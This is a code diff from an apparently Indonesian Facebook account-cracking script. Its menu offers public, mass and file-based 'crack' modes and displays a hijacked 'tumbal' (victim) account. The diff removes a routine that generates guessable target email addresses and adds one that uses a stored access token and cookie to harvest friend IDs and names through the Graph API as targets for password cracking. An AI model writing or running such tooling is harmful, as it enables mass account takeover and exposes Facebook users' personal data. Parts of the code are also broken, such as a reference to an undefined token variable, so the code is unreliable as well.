@@ -394,7 +394,7 @@ def menu():
 	os.system('clear')
 	banner()
 	prints(panel(f"""[white][[cyan]•[white]] Name Tumbal [[green]{nama}[white]]\n[[cyan]•[white]] Idz Tumbal [white][[green]{uidfb}[white]]\n[white][[cyan]•[white]] Your Ip [[green]{alamat_ip}[white]]""",width=43,title=f"[[green] INFO [/]]",style=f"bold blue"))
-	prints(panel(f"""[white][[cyan]01[white]] Crack Publik [[green]ON[white]] \n[[cyan]02[white]] Crack Massal [white][[red]OF[white]] \n[[cyan]03[white]] Crack Email [white][[green]ON[white]] \n[[cyan]04[white]] Crack File [white][[green]ON[white]] \n[[cyan]05[white]] Result Ok/Cp [[green]ON[white]]\n[[red]00[white]] logout [white][[red]hapus cookies[white]] [[green]ON[white]] """,width=43,title=f"[[green] MENU CRACK [/]]",style=f"bold blue"))
+	prints(panel(f"""[white][[cyan]01[white]] Crack Publik [[green]ON[white]] \n[[cyan]02[white]] Crack Massal [white][[red]OF[white]] \n[[cyan]03[white]] Crack File [white][[green]ON[white]] \n[[cyan]04[white]] Result Ok/Cp [[green]ON[white]]\n[[red]00[white]] logout [white][[red]hapus cookies[white]] [[green]ON[white]] """,width=43,title=f"[[green] MENU CRACK [/]]",style=f"bold blue"))
 	CYXIEON_GANTENG = input(f'{biru}└──[{puti}{ung} Input {puti}:{hijo} ')
 	if CYXIEON_GANTENG in ['01','1']:
 	    print(f"\n{biru}╭────────────────────────────────────────────{puti}")
@@ -403,12 +403,10 @@ def menu():
 	    dump(idt,"",{"cookie":cok},token)
 	    atur_id()
 	if CYXIEON_GANTENG in ['02','2']:
-	   massal()
+	   dump_massal()
 	elif CYXIEON_GANTENG in ['03','3']:
-	        mail2()
-	elif CYXIEON_GANTENG in ['04','4']:
 	        Crack_file()
-	elif CYXIEON_GANTENG in ['05','5']:
+	elif CYXIEON_GANTENG in ['04','4']:
 	        result1()
 	elif CYXIEON_GANTENG in ['00','0']:
             ganti_cokies()
@@ -469,38 +467,53 @@ def massal():
 	    exit()
 	except (KeyError,IOError):
 		exit()
-#-----------------[ CRACK EMAIL ]-----------------#
-def mail2():
-	dump=[]
-	global prog,des
-	rc = random.choice
-	rr = random.randint
-	tengah = ['mulyana','mulyono','ramdani','ramdan','ramadhan','ramadhani','saputra','syahputra','wijaya','kusuma','irawan','wirawan','setiawan','setyawan','hamdani','dermawan','sulaeman','pasundan','gumilang','gumilar','saepuloh','setiadi','rusmana','lesmana','suparman','hermansah','suherman','wijayanto','saripudin','saepudin','firmansyah','hidayat','kurnia','kurniawan','ramadani','muhamad','alamsyah','maulana','aprilia','apriliani','yulianti','julianti','sumiati','rahayu','saluyu','maharani','mulyani','rusmini','aisyah','fatimah','lestari','mulyati','damayanti','pertiwi','handayani','azizah','apipah','aropah','nuraisah','nurlaila','nursafitri','nurcahaya','nurjanah','nurfatimah','rahmawati','rosmawati','larasti','purnama','nurohman','nurahman','adinda','sumarni','sukaesih','bintang','kirana','cahyani','nurarsyila','amanda','sulastri','septiani','kartina','karlina','nuraropah','isabela','safitri','mawarni','rofikah','nengsih','ningsih','yuningsih','yunengsih','suningsih','sunengsih','malaka','azzahra','larasati','pertiwi','pratiwi','asyifa','aminah','nasution','sitorus','sinaga','sihombing','simamora','saepuloh','susanto','santoso','nursuci','khoerunisa','fitriani','sutomo','khan','singh','hartono','ruhyadi','ardiansyah','hardiansyah','herdiansyah','sinaga','prasti','kejora','rokayah','supriadi','willyam','wibowo','armada','darmawan','badriah','sulistia','fadilah','natalia','handayani','rusmiati','nurahma,nursakila,salsabila','hungkul','sayang','gaming','utama','pertama','peratama','pratama']
-	belakang = ['777','999','111','222','333','444','638','656','556','452','281','812','235','898','998','110','739','892','344','87','665','81','sumarna','dermawan','darmawan','dirgantara','wijayanto','wijayanti','01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','34','35','36','38','39','40','41','42','42','43','44','50','45','46','47','48','49','51','231','241','772','829','610','64','628','528','422','241','321','537','771','883','836','929','737','123','288','913','891','88','66','77','66','55','991','728','923','112','372','882','9238','194','883','809','293','251','726','332','231','829','980','8247','3738','2894','118','119','621','535','567','765','776','236','266','115','825','653','712','210','019','738','538','729','753','436','82','83','766','667','554','445','133','1933','1982','2000','200238','7279','2838','638','9293','789','009','402','452','455','566','655',',223','332','331','313','62','63','64','65','66','67','68','gaming','123','321','332','033','721','768','988','998','901','425','719','223','7789','0018','335','827','811','880','092','064','862','6672','82','91','21','23','31','45','54','677','882','98','890','728','112','221','236','221','621','722','112','829','xd','ramdani','ramadani','maulana','aisyah','773','663','724','252','332','173','809','713','739','221','114','116','117','752','82','56','64','001','002','003','004','005','006','009''102','628','791','991','88','667','66','78','173','992','32','007','07','08','09','01','02','03','04','05','06','66','99','723','820','61','231','geulis','032','610','889','883','812','72','77','101','official','gaming','utama','123','1234','12345','123456','cakep','90','96','25']
-	tengah = ['widianti','yuliyanti','yulianto','supomo','sapitri','rancaekek','yuliana','aprianti','aprilianti','andini','hasanah','karimah','halimah','salamin','farida','adinda','kurniasih','sulistiawati','nurkarimah','nurazizah','daniati','geulis','cantik','imut','gemoy','kece','indrawan','rachmatika','sugiarti','sugih','ferdiansyah','nuraropah','sagita','nuralisa','setiawati','ramayanti','soraya','badriah','sutomo','supardi','supriadi','suparman','solehah','kasep']
-	global ok , cc
-	print(f"\n{biru}╭────────────────────────────────────────────{puti}")
-	nama = input(f'└──[ nama target : ')
-	if ',' in str(nama):
-		print(f'  └──[ masukan nama, jangan kosong ')
-		time.sleep(3);str(nama)
-	doma = input(f'└──[ domain (ex:@gmail.com) : ')
-	if '@' not in str(doma) or '.com' not in str(doma):
-		print(f'  └──[ masukkan domain dengan benar ')
-		time.sleep(3);str(doma)
-	jumlah = input(f'└──[ total dump (max:10000) : ')
-	for xyz in range(int(jumlah)):
-		AA = nama
-		BB = [f'{str(rc(tengah))}',f'{str(rr(0,31))}',f'{str(rc(belakang))}']
-		CC = doma
-		DD = f'{AA}{str(rc(BB))}{CC}'
-		if DD in id:pass
-		else:id.append(DD+'|'+nama)
-		if len(dump)==999999:passwordlist()
-		sys.stdout.write(f"\r└──[ berhasil mengumpulkan {b}{len(id)} {P}email...");sys.stdout.flush()
-		time.sleep(0.0000003)
-	print("\r")
-	atur_id()
+#-------------------[ CRACK-PUBLIK ]----------------#
+def dump_massal():
+	try:
+		token = open('.tok.txt','r').read()
+		cok = open('.cok.txt','r').read()
+	except IOError:
+		exit()
+	try:
+		jum = int(input('>> Mau Berapa Target ? : '))
+	except ValueError:
+		print('>> Masukkan Angka, Malah Huruff ')
+		exit()
+	if jum<1 or jum>100:
+		print('>> Gagal Dump ID ')
+		exit()
+	ses=requests.Session()
+	yz = 0
+	for met in range(jum):
+		yz+=1
+		kl = input('ID KE '+str(yz)+' : ')
+		uid.append(kl)
+	for userr in uid:
+		try:
+			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
+			for mi in col['friends']['data']:
+				try:
+					iso = (mi['id']+'|'+mi['name'])
+					if iso in id:pass
+					else:id.append(iso)
+				except:continue
+		except (KeyError,IOError):
+			pass
+		except requests.exceptions.ConnectionError:
+			print('>> Sinyal Loh Kek Kontoll ')
+			exit()
+	try:
+		print('')
+		print(f'>> IDYang Terkumpul{h}'+str(len(id)))
+		atur_id()
+	except requests.exceptions.ConnectionError:
+		print(f'{x}')
+		print('>> Sinyal kek Kontol ')
+		back()
+	except (KeyError,IOError):
+		print(f'>>{k} Pertemanan Tidak Public {x}')
+		time.sleep(3)
+		back()
 ###-----[ CRACK FILE ]-----###
 def Crack_file():
 	print(f"\n{biru}╭────────────────────────────────────────────{puti}")
